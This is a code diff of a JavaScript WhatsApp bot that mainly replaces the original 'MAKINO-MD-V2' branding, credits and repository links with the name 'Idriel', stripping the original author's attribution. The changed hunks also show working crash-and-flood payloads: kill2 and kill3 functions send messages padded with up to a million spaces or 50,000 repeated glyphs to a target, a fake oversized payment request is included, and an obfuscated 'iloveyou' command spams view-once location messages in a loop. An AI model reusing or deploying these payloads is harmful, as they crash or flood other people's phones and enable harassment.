@@ -281,18 +281,18 @@ m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||               
       forwardingScore: 9999999,
       isForwarded: true,
       forwardedNewsletterMessageInfo: {
-      newsletterName: "♱MAKINO-MD-V2♱♡⃤",
+      newsletterName: "♱𝙸𝚍𝚛𝚒𝚎𝚕⃤",
       newsletterJid: "120363320283062687@newsletter",
       },
       "externalAdReply": {
       "showAdAttribution": true,
       "containsAutoReply": true,
-      "title": `♱MAKINO-MD-V2♱♡⃤`,
+      "title": `♱𝙸𝚍𝚛𝚒𝚎𝚕⃤`,
       "body": `Hi ${pushname} 👋`,
       "previewType": "PHOTO",
       "thumbnailUrl": ``,
       "thumbnail": fs.readFileSync(`./Assets/pic7.jpg`),
-      "sourceUrl": `https://whatsapp.com/channel/0029Vag5l2ALSmbi14YryJ2r`}}},
+      "sourceUrl": `https://chat.whatsapp.com/Lah0hBJn6ro4lXbLJik0Y2`}}},
       { quoted: m})
 	  }
 	  
@@ -428,7 +428,7 @@ const v2features = () =>{
       const uptimeInSeconds = Math.floor(process.uptime());
       const uptimeFormatted = formatTime(uptimeInSeconds);
 
-      function _0x582b(_0xabb6f8, _0x12cdd8) { const _0x58e890 = _0x58e8(); return _0x582b = function (_0x582b90, _0x4387b3) { _0x582b90 = _0x582b90 - 0x189; let _0x932613 = _0x58e890[_0x582b90]; return _0x932613; }, _0x582b(_0xabb6f8, _0x12cdd8); } function _0x58e8() { const _0x109554 = ['12896370RDSmnX', '3BgvPel', '189HbmdoW', '18854HvEPNh', '11TZHUID', '9125326EcyeIg', '464328lPaAMf', '3400722cbWEOK', '2263175KIczdo', '12TaHNqM', '2521564eqJRHK']; _0x58e8 = function () { return _0x109554; }; return _0x58e8(); } (function (_0x429d7b, _0x532ab5) { const _0x527567 = _0x582b, _0x130eb4 = _0x429d7b(); while (!![]) { try { const _0x75c57a = -parseInt(_0x527567(0x18b)) / 0x1 + -parseInt(_0x527567(0x192)) / 0x2 * (-parseInt(_0x527567(0x189)) / 0x3) + parseInt(_0x527567(0x191)) / 0x4 * (-parseInt(_0x527567(0x190)) / 0x5) + -parseInt(_0x527567(0x18f)) / 0x6 + parseInt(_0x527567(0x18d)) / 0x7 + parseInt(_0x527567(0x18e)) / 0x8 * (-parseInt(_0x527567(0x18a)) / 0x9) + parseInt(_0x527567(0x193)) / 0xa * (parseInt(_0x527567(0x18c)) / 0xb); if (_0x75c57a === _0x532ab5) break; else _0x130eb4['push'](_0x130eb4['shift']()); } catch (_0x19ea04) { _0x130eb4['push'](_0x130eb4['shift']()); } } }(_0x58e8, 0xa8dae)); const status = 'Makino-md-v2 By ᴛᴀɪʀᴀ ᴍᴀᴋɪɴᴏ alive since ' + uptimeFormatted;
+      function _0x582b(_0xabb6f8, _0x12cdd8) { const _0x58e890 = _0x58e8(); return _0x582b = function (_0x582b90, _0x4387b3) { _0x582b90 = _0x582b90 - 0x189; let _0x932613 = _0x58e890[_0x582b90]; return _0x932613; }, _0x582b(_0xabb6f8, _0x12cdd8); } function _0x58e8() { const _0x109554 = ['12896370RDSmnX', '3BgvPel', '189HbmdoW', '18854HvEPNh', '11TZHUID', '9125326EcyeIg', '464328lPaAMf', '3400722cbWEOK', '2263175KIczdo', '12TaHNqM', '2521564eqJRHK']; _0x58e8 = function () { return _0x109554; }; return _0x58e8(); } (function (_0x429d7b, _0x532ab5) { const _0x527567 = _0x582b, _0x130eb4 = _0x429d7b(); while (!![]) { try { const _0x75c57a = -parseInt(_0x527567(0x18b)) / 0x1 + -parseInt(_0x527567(0x192)) / 0x2 * (-parseInt(_0x527567(0x189)) / 0x3) + parseInt(_0x527567(0x191)) / 0x4 * (-parseInt(_0x527567(0x190)) / 0x5) + -parseInt(_0x527567(0x18f)) / 0x6 + parseInt(_0x527567(0x18d)) / 0x7 + parseInt(_0x527567(0x18e)) / 0x8 * (-parseInt(_0x527567(0x18a)) / 0x9) + parseInt(_0x527567(0x193)) / 0xa * (parseInt(_0x527567(0x18c)) / 0xb); if (_0x75c57a === _0x532ab5) break; else _0x130eb4['push'](_0x130eb4['shift']()); } catch (_0x19ea04) { _0x130eb4['push'](_0x130eb4['shift']()); } } }(_0x58e8, 0xa8dae)); const status = ' ' + uptimeFormatted;
 
       Taira.setStatus(status); // Set the status using Taira.setStatus or your equivalent method
 
@@ -447,7 +447,7 @@ remoteJid: "status@broadcast"
 },
 message: {
 listResponseMessage: {
-title: `♱MAKINO-MD-V2♱♡⃤`
+title: `╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱`
 }
 }
 }
@@ -470,7 +470,7 @@ remoteJid: "status@broadcast"
 "buttons": [
 {
 "name": "review_and_pay",
-"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"♱MAKINO-MD-V2♱ ✘ ♡⃤ ᴸᴼᴿᴰᴛᴀɪʀᴀ ☠︎︎⧫⃝♱؜+"ꦾ"\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
+"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱؜+"ꦾ"\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
 }
 ]
 }
@@ -489,7 +489,7 @@ message: {
   "liveLocationMessage": {
     "degreesLatitude": "p",
     "degreesLongitude": "p",
-    "caption": `♱MAKINO-MD-V2♱♡⃤؜`+"ꦾ".repeat(50000),                  
+    "caption": `╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱`+"ꦾ".repeat(50000),                  
     "sequenceNumber": "0",
     "jpegThumbnail": ""
      }
@@ -524,7 +524,7 @@ async function kill2(target, quoted) {
  var lol = generateWAMessageFromContent(target, proto.Message.fromObject({
     interactiveMessage: {
       header: {
-        title: "♱MAKINO-MD-V2♱♡⃤",
+        title: "╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱",
         hasMediaAttachment: true,
         ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/d7b7e5083a8955b5a30d8.png" } }, { upload: Taira.waUploadToServer }))
       },
@@ -532,7 +532,7 @@ async function kill2(target, quoted) {
         text: ""
       },
       footer: {
-        text: "›          #MakinoByTaira"
+        text: "›         ╶⃝♱𝙸𝚍𝚛𝚒𝚎𝚕×𝙸𝚍𝚛𝚒𝚎𝚕♱"
       },
       nativeFlowMessage: {
         messageParamsJson: " ".repeat(1000000)
@@ -545,9 +545,9 @@ await Taira.relayMessage(target, lol.message, { participant: { jid: target }, me
 async function kill3(target, quoted) {
  var lol = generateWAMessageFromContent(target, proto.Message.fromObject({
   'listMessage': {
-    'title': "♱MAKINO-MD-V2♱♡⃤"+" ".repeat(920000),
-        'footerText': `♱MAKINO-MD-V2♱♡⃤؜`,
-        'description': `♱MAKINO-MD-V2♱♡⃤؜`,
+    'title': "╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱"+" ".repeat(920000),
+        'footerText': `╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱`,
+        'description': `╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱`,
         'buttonText': null,
         'listType': 2,
         'productListInfo': {
@@ -564,7 +564,7 @@ async function kill3(target, quoted) {
           'businessOwnerJid': '0@s.whatsapp.net'
         }
       },
-      'footer': 'Makino',
+      'footer': '𝙸𝚍𝚛𝚒𝚎𝚕',
       'contextInfo': {
         'expiration': 604800,
         'ephemeralSettingTimestamp': "1679959486",
@@ -661,9 +661,9 @@ Typed *surrender* to surrender and admited defeat`
    const responses = {
    
   hello: `Hello ${pushname}, I am ${BotName}. My current prefix is "${prefix}". How can I help you?`,
-  taira: `That's my creator name 😊 ,Thank you for using a bot from him...`,
-  makino: `That's my Creator name ,Thank you for using a bot from him 🤗 ...`,
-  fred: `I am busy,will reply you when I f33l like (¬_¬)ﾉ...`,
+  Luxi4Kitsu: `That's my creator name 😊 ,Thank you for using a bot from him...`,
+  Idriel: `That's my Creator name ,Thank you for using a bot from him 🤗 ...`,
+  Idriell: `I am busy,will reply you when I f33l like (¬_¬)ﾉ...`,
   runtime: `Hey ${pushname}\n${nowtime}\n\nMy runtime:${runtime(process.uptime())}\n\nPrefix is: *${prefix}*\n\nTime: ${kaitime}\n\nDate: ${kaidate}\n\nToday is ${currentDay}`,
   konichiwa: `Konichiwa ${pushname}, I am ${BotName}. How can I help you?`,
   'good morning': `Good morning to you too ${pushname} ☺️. Have a great day 😇`,
@@ -721,9 +721,9 @@ case 'vv': {
         buffer = Buffer.concat([buffer, chunk])
     }
     if (/video/.test(type)) {
-        return Taira.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '♱MAKINO-MD-V2♱♡⃤ᴇ', m)
+        return Taira.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱', m)
     } else if (/image/.test(type)) {
-        return Taira.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '♱MAKINO-MD-V2♱♡⃤ᴇ', m)
+        return Taira.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱', m)
     }
 }
 break
@@ -820,7 +820,7 @@ break
       }
       
         case 'iloveyou': case 'kissme' : {
-const _0x239866=_0x3ec6;function _0x19aa(){const _0x582e64=['10RBBLyx','message','804254vkWgVB','fromObject','Add\x20an\x20amount:\x20\x20.','\x20times\x20😔\x20♡⃤*\x0a\x0a>\x20*TOXIC*','key','./Assets/pic7.jpg','576IBQDws','1180564GAdPdv','5SrvaFO','744709HUVTbi','14167107kbEeTT','591060ZGwQoa','relayMessage','chat','Message','7343922AnpDHw','110091QMsuHw','12bMqpVr','32rLfNve','botowner'];_0x19aa=function(){return _0x582e64;};return _0x19aa();}(function(_0xe62ba6,_0x321e68){const _0x3a7e61=_0x3ec6,_0x223b69=_0xe62ba6();while(!![]){try{const _0x1aede8=-parseInt(_0x3a7e61(0x6e))/0x1*(-parseInt(_0x3a7e61(0x6f))/0x2)+parseInt(_0x3a7e61(0x69))/0x3+-parseInt(_0x3a7e61(0x7b))/0x4+-parseInt(_0x3a7e61(0x7c))/0x5*(parseInt(_0x3a7e61(0x6d))/0x6)+-parseInt(_0x3a7e61(0x7d))/0x7*(parseInt(_0x3a7e61(0x70))/0x8)+-parseInt(_0x3a7e61(0x7e))/0x9*(parseInt(_0x3a7e61(0x72))/0xa)+-parseInt(_0x3a7e61(0x74))/0xb*(-parseInt(_0x3a7e61(0x7a))/0xc);if(_0x1aede8===_0x321e68)break;else _0x223b69['push'](_0x223b69['shift']());}catch(_0x2c6f44){_0x223b69['push'](_0x223b69['shift']());}}}(_0x19aa,0xcf16f));if(!isCreator)return reply(mess[_0x239866(0x71)]);if(!q)return reply(_0x239866(0x76)+command+'\x201');function _0x3ec6(_0x57597c,_0x2a00bd){const _0x19aa45=_0x19aa();return _0x3ec6=function(_0x3ec6f1,_0x2fba1a){_0x3ec6f1=_0x3ec6f1-0x69;let _0x1b5392=_0x19aa45[_0x3ec6f1];return _0x1b5392;},_0x3ec6(_0x57597c,_0x2a00bd);}await reply('processing.....');for(let j=0x0;j<q;j++){var etc=generateWAMessageFromContent(m[_0x239866(0x6b)],proto[_0x239866(0x6c)][_0x239866(0x75)]({'viewOnceMessage':{'message':{'liveLocationMessage':{'degreesLatitude':'p','degreesLongitude':'p','caption':'♱MAKINO-MD-V2♱♡⃤\x20|\x20♱ταιяα\x20мακιиο♱','sequenceNumber':'0','jpegThumbnail':fs['readFileSync'](_0x239866(0x79))}}}}),{'userJid':m[_0x239866(0x6b)],'quoted':quote});await Taira[_0x239866(0x6a)](m[_0x239866(0x6b)],etc[_0x239866(0x73)],{'messageId':etc[_0x239866(0x78)]['id']});}await reply('>\x20*ταιяα\x20мακιиο*\x0a\x0a*I\x20love\x20you\x20too\x20'+q+_0x239866(0x77));
+const _0x239866=_0x3ec6;function _0x19aa(){const _0x582e64=['10RBBLyx','message','804254vkWgVB','fromObject','Add\x20an\x20amount:\x20\x20.','\x20times\x20😔\x20♡⃤*\x0a\x0a>\x20*TOXIC*','key','./Assets/pic7.jpg','576IBQDws','1180564GAdPdv','5SrvaFO','744709HUVTbi','14167107kbEeTT','591060ZGwQoa','relayMessage','chat','Message','7343922AnpDHw','110091QMsuHw','12bMqpVr','32rLfNve','botowner'];_0x19aa=function(){return _0x582e64;};return _0x19aa();}(function(_0xe62ba6,_0x321e68){const _0x3a7e61=_0x3ec6,_0x223b69=_0xe62ba6();while(!![]){try{const _0x1aede8=-parseInt(_0x3a7e61(0x6e))/0x1*(-parseInt(_0x3a7e61(0x6f))/0x2)+parseInt(_0x3a7e61(0x69))/0x3+-parseInt(_0x3a7e61(0x7b))/0x4+-parseInt(_0x3a7e61(0x7c))/0x5*(parseInt(_0x3a7e61(0x6d))/0x6)+-parseInt(_0x3a7e61(0x7d))/0x7*(parseInt(_0x3a7e61(0x70))/0x8)+-parseInt(_0x3a7e61(0x7e))/0x9*(parseInt(_0x3a7e61(0x72))/0xa)+-parseInt(_0x3a7e61(0x74))/0xb*(-parseInt(_0x3a7e61(0x7a))/0xc);if(_0x1aede8===_0x321e68)break;else _0x223b69['push'](_0x223b69['shift']());}catch(_0x2c6f44){_0x223b69['push'](_0x223b69['shift']());}}}(_0x19aa,0xcf16f));if(!isCreator)return reply(mess[_0x239866(0x71)]);if(!q)return reply(_0x239866(0x76)+command+'\x201');function _0x3ec6(_0x57597c,_0x2a00bd){const _0x19aa45=_0x19aa();return _0x3ec6=function(_0x3ec6f1,_0x2fba1a){_0x3ec6f1=_0x3ec6f1-0x69;let _0x1b5392=_0x19aa45[_0x3ec6f1];return _0x1b5392;},_0x3ec6(_0x57597c,_0x2a00bd);}await reply('processing.....');for(let j=0x0;j<q;j++){var etc=generateWAMessageFromContent(m[_0x239866(0x6b)],proto[_0x239866(0x6c)][_0x239866(0x75)]({'viewOnceMessage':{'message':{'liveLocationMessage':{'degreesLatitude':'p','degreesLongitude':'p','caption':'╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱\x20|\x20♱ταιяα\x20мακιиο♱','sequenceNumber':'0','jpegThumbnail':fs['readFileSync'](_0x239866(0x79))}}}}),{'userJid':m[_0x239866(0x6b)],'quoted':quote});await Taira[_0x239866(0x6a)](m[_0x239866(0x6b)],etc[_0x239866(0x73)],{'messageId':etc[_0x239866(0x78)]['id']});}await reply('>\x20*ταιяα\x20мακιиο*\x0a\x0a*I\x20love\x20you\x20too\x20'+q+_0x239866(0x77));
 }
 break
         
@@ -883,8 +883,8 @@ case 'sc': case 'script': case 'repo': case "link": {
         if (isBanChat) return reply(mess.bangc);
         try {
           await Taira.sendMessage(from, { react: { text: "❤", key: m.key } });
-          let { data } = await axios.get('https://api.github.com/repos/anonphoenix007/MAKINO-MD-V2');
-          let teks = `♱MAKINO-MD-V2♱♡⃤ᴇ*\n\n*Total Stars*: ${data.stargazers_count}⭐\n*Total Forks*: ${data.forks_count} forks\n*GitHub*: github.com/anonphoenix007/MAKINO-MD-V2\n\nDon't forget to follow me on *GitHub* and give a ⭐️ to my projects.`;
+          let { data } = await axios.get('');
+          let teks = `╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱*\n\n*Total Stars*: ${data.stargazers_count}⭐\n*Total Forks*: ${data.forks_count}\n\nnot gonna give you up.`;
 
           let msg = generateWAMessageFromContent(m.key.remoteJid, {
             viewOnceMessage: {
@@ -898,18 +898,18 @@ case 'sc': case 'script': case 'repo': case "link": {
                     text: teks
                   }),
                   footer: proto.Message.InteractiveMessage.Footer.create({
-                    text: "By Tᴀɪʀᴀ Mᴀᴋɪɴᴏ"
+                    text: "By 𝙻𝚄𝚇𝙸4𝙺𝙸𝚃𝚂𝚄"
                   }),
                   header: proto.Message.InteractiveMessage.Header.create({
-                    title: "©Tᴀɪʀᴀ•Mᴀᴋɪɴᴏ2024",
-                    subtitle: "♱MAKINO-MD-V2♱♡⃤",
+                    title: "𝙻𝚄𝚇𝙸4𝙺𝙸𝚃𝚂𝚄",
+                    subtitle: "╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱",
                     hasMediaAttachment: false
                   }),
                   nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                     buttons: [
                       {
                         "name": "cta_url",
-                        "buttonParamsJson": "{\"display_text\":\"Repository\",\"url\":\"https://github.com/anonphoenix007/MAKINO-MD-V2\",\"merchant_url\":\"https://github.com/anonphoenix007/MAKINO-MD-V2\"}"
+                        "buttonParamsJson": "{\"display_text\":\"Repository\",\"url\":\"\",\"merchant_url\":\"\"}"
                       }
                     ]
                   })
@@ -942,7 +942,7 @@ case 'sc': case 'script': case 'repo': case "link": {
         try {
           await Taira.sendMessage(from, { react: { text: "📍", key: m.key } });
         let respon = `
-     ♱MAKINO-MD-V2♱♡⃤.server
+     ╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱.server
   
   *System*: ${systemName}
   *RAM*: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
@@ -965,18 +965,18 @@ case 'sc': case 'script': case 'repo': case "link": {
                     text: respon
                   }),
                   footer: proto.Message.InteractiveMessage.Footer.create({
-                    text: "By Tᴀɪʀᴀ Mᴀᴋɪɴᴏ"
+                    text: "╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱"
                   }),
                   header: proto.Message.InteractiveMessage.Header.create({
-                    title: "©Tᴀɪʀᴀ•Mᴀᴋɪɴᴏ2024",
-                    subtitle: "♱MAKINO-MD-V2♱♡⃤",
+                    title: "╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱",
+                    subtitle: "╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱",
                     hasMediaAttachment: false
                   }),
                   nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                     buttons: [
                       {
                         "name": "cta_url",
-                        "buttonParamsJson": "{\"display_text\":\"Repo🔗\",\"url\":\"https://github.com/anonphoenix007/MAKINO-MD-V2\",\"merchant_url\":\"https://github.com/anonphoenix007/MAKINO-MD-V2\"}"
+                        "buttonParamsJson": "{\"display_text\":\"Repo🔗\",\"url\":\"\",\"merchant_url\":\"\"}"
                       },
 		      {
                         "name": "cta_url",
@@ -1089,7 +1089,7 @@ case 'tovv': {
         getServerIp()
           .then(serverIp => {
             if (serverIp) {
-              const message = `🐦Makino-md-v2 ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ server address is: ${serverIp}`;
+              const message = `𝙸𝚍𝚛𝚒𝚎𝚕 ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ server address is: ${serverIp}`;
               Taira.sendMessage(from, { text: message }, { quoted: m });
             } else {
               Taira.sendMessage(from, { text: 'Failed to fetch server IP address.' }, { quoted: m });
@@ -1288,9 +1288,9 @@ case 'tovv': {
         Taira.sendMessage(from, { react: { text: "❤️", key: m.key } })
 
         reply(`
-        *╭════════════════ ⪩*
-        *┃〘 *♱MAKINO-MD-V2♱♡⃤* 〙*
-        *╰════════════════ ⪨!*\n\n
+        *╭════════════════ ♱*
+        *┃〘 *╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱* 〙*
+        *╰════════════════ ♱*\n\n
          bonk
          cry
          bully
@@ -1370,7 +1370,7 @@ case 'tovv': {
         for (let i = 0; i < imagesToSend; i++) {
           let message = {
             image: { url: wallpapers[i].image },
-            footer: `♱MAKINO-MD-V2♱♡⃤`,
+            footer: `╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱`,
             headerType: 4
           };
           Taira.sendMessage(m.chat, message, { quoted: m });
@@ -1392,7 +1392,7 @@ case 'tovv': {
         let buttonMessage = {
           image: { url: hasil.image },
           caption: `Title : ${hasil.title}\nSource : ${hasil.source}\nMedia Url : ${hasil.image}`,
-          footer: `♱MAKINO-MD-V2♱♡⃤`,
+          footer: `╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱`,
           buttons: buttons,
           headerType: 4
         }
@@ -1426,7 +1426,7 @@ case 'tovv': {
               from,
               {
                 text: "Anime Search",
-                footer: '♱MAKINO-MD-V2♱♡⃤',
+                footer: '╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱',
                 title: OwnerName,
                 buttonText: "Search Results",
                 sections
@@ -2118,7 +2118,7 @@ case 'tovv': {
         if (isBanChat) return reply(mess.bangc);
         Taira.sendMessage(from, { react: { text: "💫", key: m.key } });
         if (!args[0]) {
-          return reply(`Please provide the GitHub repository link.\nExample:\n${prefix}${command} https://github.com/anonphoenix007/MAKINO-MD-V2`);
+          return reply(`Please provide the GitHub repository link.\nExample:\n${prefix}${command} `);
         }
         if (!isUrl(args[0]) || !args[0].includes('github.com')) {
           return reply(`Invalid or non-GitHub repository link provided. Please use a valid GitHub repository link.`);
@@ -2146,7 +2146,7 @@ case 'tovv': {
         Taira.sendMessage(from, { react: { text: "🫡", key: m.key } })
 
         let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v)
-        let teks = ` 「  ♱MAKINO-MD-V2♱♡⃤ pm user list  」\n\nTotal ${anu.length} users are using ♱MAKINO-MD-V2♱♡⃤ in personal chat.`
+        let teks = ` 「  ╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱ pm user list  」\n\nTotal ${anu.length} users are using ╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱ in personal chat.`
         for (let i of anu) {
           teks += `\n\nProfile : @${i.id.split('@')[0]}\nChat : ${i.unreadCount}\nLastchat : ${moment(i.conversationTimestamp * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`
         }
@@ -2655,9 +2655,9 @@ case 'tovv': {
         if (!isCreator) return reply(mess.botowner);
         Taira.sendMessage(from, { react: { text: "⚠️", key: m.key } })
         if (args[0] === "on") {
-          if (isBanChat) return reply('This Group is Already Banned from using ♱MAKINO-MD-V2♱♡⃤');
+          if (isBanChat) return reply('This Group is Already Banned from using ╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱');
           banchat.push(from);
-          reply('This Group has been banned from using ♱MAKINO-MD-V2♱♡⃤!');
+          reply('This Group has been banned from using ╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱!');
           var groupe = await Taira.groupMetadata(from);
           var members = groupe['participants'];
           var mems = [];
@@ -2666,10 +2666,10 @@ case 'tovv': {
           });
           Taira.sendMessage(from, { text: `\`\`\`「 Notice 」\`\`\`\n\nThis group is banned from using the bot. So, here nobody can use me anymore!`, contextInfo: { mentionedJid: mems } }, { quoted: m });
         } else if (args[0] === "off") {
-          if (!isBanChat) return reply('This Group is Already Banned from using ♱MAKINO-MD-V2♱♡⃤!');
+          if (!isBanChat) return reply('This Group is Already Banned from using ╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱!');
           let off = banchat.indexOf(from);
           banchat.splice(off, 1);
-          reply('This Group has been *unbanned* from using ♱MAKINO-MD-V2♱♡⃤!');
+          reply('This Group has been *unbanned* from using ╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱!');
         } else {
           reply('Please choose either *"on"* or *"off"* to ban or unban the group from using the bot.');
         }
@@ -2750,7 +2750,7 @@ case 'tovv': {
         if (!m.isGroup) return reply(mess.grouponly);
         if (!isAdmins && !isCreator) return reply(mess.useradmin)
         Taira.sendMessage(from, { react: { text: "😳", key: m.key } })
-        let teks = `♱MAKINO-MD-V2♱♡⃤
+        let teks = `╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱
 
 *Message : ${args.join(" ") ? args.join(" ") : 'no message'}*\n\n ${readmore}`
         for (let mem of participants) {
@@ -2776,14 +2776,14 @@ case 'tovv': {
         Taira.sendMessage(from, { react: { text: "💧", key: m.key } })
        // await m.reply(`Pong ${latensie.toFixed(4)} ms`)
     const startTime = new Date();
-  const pingMsg = await Taira.sendMessage(m.chat, { text: '*♱MAKINO-MD-V2♱♡⃤...*' }, { quoted: statrp });
+  const pingMsg = await Taira.sendMessage(m.chat, { text: '*╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱...*' }, { quoted: statrp });
 
  await Taira.relayMessage(m.chat, {
       protocolMessage: {
         key: pingMsg.key,
         type: 14,
         editedMessage: {
-          conversation: `*♱MAKINO-MD-V2♱♡⃤ response speed* *${new Date() - startTime}* ms`
+          conversation: `*╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱ response speed* *${new Date() - startTime}* ms`
         }
       }
     }, {});
@@ -2904,7 +2904,7 @@ case 'tovv': {
         Taira.sendMessage(from, { react: { text: "🪄", key: m.key } })
         let response = await Taira.groupInviteCode(m.chat)
         Taira.sendMessage(m.chat, {
-          text: `*Group Name:* *${groupMetadata.subject}* \n\n*Group Link :* \nhttps://chat.whatsapp.com/${response}\n\n♱MAKINO-MD-V2♱♡⃤`, "contextInfo": {
+          text: `*Group Name:* *${groupMetadata.subject}* \n\n*Group Link :* \nhttps://chat.whatsapp.com/${response}\n\n╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱`, "contextInfo": {
             "forwardingScore": 1000000000,
             isForwarded: true,
           }
@@ -3091,7 +3091,7 @@ case 'tovv': {
                   text: null
                 }),
                 footer: proto.Message.InteractiveMessage.Footer.create({
-                  text: '            Powered by Taira Makino'
+                  text: '            Powered by 𝙸𝚍𝚛𝚒𝚎𝚕'
                 }),
                 header: proto.Message.InteractiveMessage.Header.create({
                   ...(await prepareWAMessageMedia({ image: { url: 'https://r4.wallpaperflare.com/wallpaper/1003/376/845/makoto-shinkai-kimi-no-na-wa-wallpaper-0816ade8b0301c58302c014e48d2441a.jpg' } }, { upload: Taira.waUploadToServer })),
@@ -3546,7 +3546,7 @@ case 'tovv': {
         if (!args[0]) return reply(`Example: ${prefix + command} <query>\nUses : ${prefix + command} anything...`)
         let google = require('google-it')
         google({ 'query': args.join(" ") }).then(res => {
-          let teks = `「 *🐦Makino-md-v2 ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ* 」\n\n*Search term:* ${text}\n\n\n`
+          let teks = `「 *╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱ ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ* 」\n\n*Search term:* ${text}\n\n\n`
           for (let g of res) {
             teks += `*Title* : ${g.title}\n\n`
             teks += `*Description* : ${g.snippet}\n\n`
@@ -3704,7 +3704,7 @@ case 'tovv': {
           Taira.sendMessage(from, {
             video: { url: args[0] }, caption: "Succes!", contextInfo: {
               externalAdreply: {
-                title: `🐦Makino-md-v2 ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ`,
+                title: `╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱ ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ`,
                 body: `${global.OwnerName}`,
                 thumbnail: BotLogo,
                 mediaType: 2,
@@ -3804,7 +3804,7 @@ case 'tovv': {
         if (!args.join(" ")) return reply(`Example : -yts Heat waves`)
         let yts = require("youtube-yts")
         let search = await yts(args.join(" "))
-        let teks = '```「 🐦Makino-md-v2 YTS 」```\n\n Search Term: ' + text + '\n\n'
+        let teks = '```「 ╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱ YTS 」```\n\n Search Term: ' + text + '\n\n'
         let no = 1
         for (let i of search.all) {
           teks += `Result No : ${no++}\n\nTitle : ${i.title}\n\nViews : ${i.views}\n\nDuration : ${i.timestamp}\n\nUploaded : ${i.ago}\n\nAuthor : ${i.author.name}\n\nUrl : ${i.url}\n\n\n-----------------------------------------------------------------------------\n\n\n`
@@ -3942,7 +3942,7 @@ case 'tovv': {
           const data = await getLyrics(text);
 
           const message = `
-        *♱MAKINO-MD-V2♱♡⃤ lyrics*
+        *╶⃝𝙸𝚍𝚛𝚒𝚎𝚕♱ lyrics*
         *Title:* ${text}
         *Artist:* ${data.artist}
         *Album:* ${data.album}
@@ -4051,7 +4051,7 @@ case 'tovv': {
         if (isBanChat) return reply(mess.bangc);
         Taira.sendMessage(from, { react: { text: "🫡", key: m.key } })
 
-        if (!args.join(" ")) return reply(`use -take 🐦Makino-md-v2|By: Tᴀɪʀᴀ Mᴀᴋɪɴᴏ`)
+        if (!args.join(" ")) return reply(`use -take Idriel|By: Luxi4Kitsu`)
         const swn = args.join(" ")
         const pcknm = swn.split("|")[0];
         const atnm = swn.split("|")[1];
@@ -4099,12 +4099,12 @@ case 'tovv': {
